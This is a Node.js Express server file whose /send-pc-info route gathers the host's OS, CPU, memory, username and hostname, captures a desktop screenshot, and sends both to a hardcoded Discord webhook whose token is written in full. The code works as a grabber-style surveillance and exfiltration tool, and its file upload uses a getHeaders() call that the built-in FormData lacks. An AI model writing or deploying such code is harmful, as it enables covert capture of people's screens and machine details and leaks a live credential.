import express from "express";
import axios from "axios";
import os from "os";
import screenshot from "screenshot-desktop";
import fs from "fs";

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// ⚠️ Your Discord Webhook URL
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1413792755775311933/D0VIkgbQp_hHFtFjp668W68dDNwPb0bGM138aiiKoNoptVw5YUEejS7cSXTu63mphTMV";

// ✅ Root test route
app.get("/", (req, res) => {
  res.send("🚀 Webhook API with PC Info + Screenshot is running!");
});

// ✅ Send PC Info + Screenshot
app.post("/send-pc-info", async (req, res) => {
  try {
    // Collect PC info
    const pcInfo = `
💻 **PC Info**
OS: ${os.type()} ${os.release()}
Arch: ${os.arch()}
CPU: ${os.cpus()[0].model}
Cores: ${os.cpus().length}
RAM: ${(os.totalmem() / (1024 ** 3)).toFixed(2)} GB
Free RAM: ${(os.freemem() / (1024 ** 3)).toFixed(2)} GB
User: ${os.userInfo().username}
Host: ${os.hostname()}
    `;

    // Take screenshot and save
    const imgPath = "/tmp/screenshot.jpg";
    await screenshot({ filename: imgPath });

    // Send text info first
    await axios.post(DISCORD_WEBHOOK, { content: pcInfo });

    // Send screenshot as file
    const formData = new FormData();
    formData.append("file", fs.createReadStream(imgPath));

    await axios.post(DISCORD_WEBHOOK, formData, {
      headers: formData.getHeaders(),
    });

    res.json({ success: true, message: "PC info + screenshot sent ✅" });
  } catch (err) {
    console.error("Error:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
